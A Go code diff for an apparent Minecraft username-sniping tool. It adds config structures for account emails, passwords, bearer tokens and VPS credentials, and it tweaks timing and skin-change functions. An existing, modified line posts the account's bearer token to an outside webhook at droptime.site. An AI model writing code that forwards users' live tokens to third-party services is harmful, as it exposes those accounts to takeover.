@@ -32,6 +32,10 @@ type embeds struct {
 	Embeds  []embed     `json:"embeds"`
 }
 
+type Searches struct {
+	Searches string `json:"searches"`
+}
+
 type embed struct {
 	Description interface{} `json:"description"`
 	Color       interface{} `json:"color"`
@@ -59,6 +63,36 @@ type Pixel struct {
 	Color color.Color
 }
 
+type Bearers struct {
+	Bearer       string `json:"Bearer"`
+	Email        string `json:"Email"`
+	Password     string `json:"Password"`
+	AuthInterval int64  `json:"AuthInterval"`
+	AuthedAt     int64  `json:"AuthedAt"`
+	Type         string `json:"Type"`
+}
+
+type Vps struct {
+	IP       string `json:"ip"`
+	Port     string `json:"port"`
+	Password string `json:"password"`
+}
+
+type Config struct {
+	Bearers           []Bearers `json:"Bearers"`
+	ChangeSkinLink    string    `json:"ChangeSkinLink"`
+	ChangeskinOnSnipe bool      `json:"ChangeskinOnSnipe"`
+	DiscordBotToken   string    `json:"DiscordBotToken"`
+	DiscordID         string    `json:"DiscordID"`
+	GcReq             int       `json:"GcReq"`
+	MFAReq            int       `json:"MFAReq"`
+	ManualBearer      bool      `json:"ManualBearer"`
+	SpreadPerReq      int       `json:"SpreadPerReq"`
+	Vps               []Vps     `json:"Vps"`
+}
+
+var acc Config
+
 var (
 	BearersVer  []string
 	Confirmed   []string
@@ -76,6 +110,8 @@ var (
 )
 
 func init() {
+
+	acc.LoadState()
 
 	if runtime.GOOS == "windows" {
 		cmd := exec.Command("cmd", "/c", "cls")
@@ -138,8 +174,8 @@ func sendW(content string) {
 	fmt.Print(aurora.Sprintf(aurora.White("[%v] "+content), aurora.Green("INPUT")))
 }
 
-func sendInfo(status string, dropTime int64) {
-	bearerGot, emailGots, _, acc := check(status, name, fmt.Sprintf("%v", dropTime))
+func sendInfo(status string, dropTime int64, searches string) {
+	bearerGot, emailGots, _, acc := check(status, name, fmt.Sprintf("%v", dropTime), searches)
 
 	bearers.Bearers = remove(bearers.Bearers, bearerGot)
 	bearers.AccountType = remove(bearers.AccountType, acc)
@@ -159,19 +195,17 @@ func sendInfo(status string, dropTime int64) {
 // - Used to calculate delay, some of it is accurate some isnt! never rely on recommended delay.. simply base ur delay off it. -
 
 func AutoOffset() float64 {
-	var pingTimes []float64
+	var pingTimes float64
 	conn, _ := tls.Dial("tcp", "api.minecraftservices.com:443", nil)
-
+	defer conn.Close()
 	for i := 0; i < 10; i++ {
-		junk := make([]byte, 4069)
+		recv := make([]byte, 4096)
 		time1 := time.Now()
-		conn.Write([]byte("GET /minecraft/profile/name/test HTTP/1.1\r\nHost: api.minecraftservices.com\r\nAuthorization: Bearer TestToken\r\n\r\n"))
-		conn.Read(junk)
-		time2 := time.Since(time1)
-		pingTimes = append(pingTimes, float64(time2.Milliseconds()))
+		conn.Write([]byte("PUT /minecraft/profile/name/test HTTP/1.1\r\nHost: api.minecraftservices.com\r\nAuthorization: Bearer TestToken\r\n\r\n"))
+		conn.Read(recv)
+		pingTimes += float64(time.Since(time1).Milliseconds())
 	}
-
-	return float64(apiGO.Sum(pingTimes)/10000) * 5000
+	return pingTimes / 10000 * 5000
 }
 
 func jsonValue(f interface{}) []byte {
@@ -188,7 +222,7 @@ func remove(l []string, item string) []string {
 	return l
 }
 
-func check(status, name, unixTime string) (string, string, bool, string) {
+func check(status, name, unixTime, searches string) (string, string, bool, string) {
 	var bearerGot string
 	var emailGot string
 	var send bool
@@ -235,7 +269,7 @@ func check(status, name, unixTime string) (string, string, bool, string) {
 						Config string `json:"config"`
 					}
 
-					body, err := json.Marshal(data{Name: name, Bearer: bearerGot, Unix: unixTime, Config: string(jsonValue(embeds{Content: "<@" + config["DiscordID"].(string) + ">", Embeds: []embed{{Description: fmt.Sprintf("Succesfully sniped %v :skull:", name), Color: 770000, Footer: footer{Text: "MCSN"}, Time: time.Now().Format(time.RFC3339)}}}))})
+					body, err := json.Marshal(data{Name: name, Bearer: bearerGot, Unix: unixTime, Config: string(jsonValue(embeds{Content: "<@" + config["DiscordID"].(string) + ">", Embeds: []embed{{Description: fmt.Sprintf("Succesfully sniped %v with %v searches:skull:", name, searches), Color: 770000, Footer: footer{Text: "MCSN"}, Time: time.Now().Format(time.RFC3339)}}}))})
 
 					if err == nil {
 						req, err := http.NewRequest("POST", "https://droptime.site/api/v2/webhook", bytes.NewBuffer(body))
@@ -377,7 +411,7 @@ func skinart(name string) {
 		authAccs()
 	}
 
-	for i := 0; i < 26; {
+	for i := 0; i < len(images); {
 		changeSkin(i)
 		i++
 	}
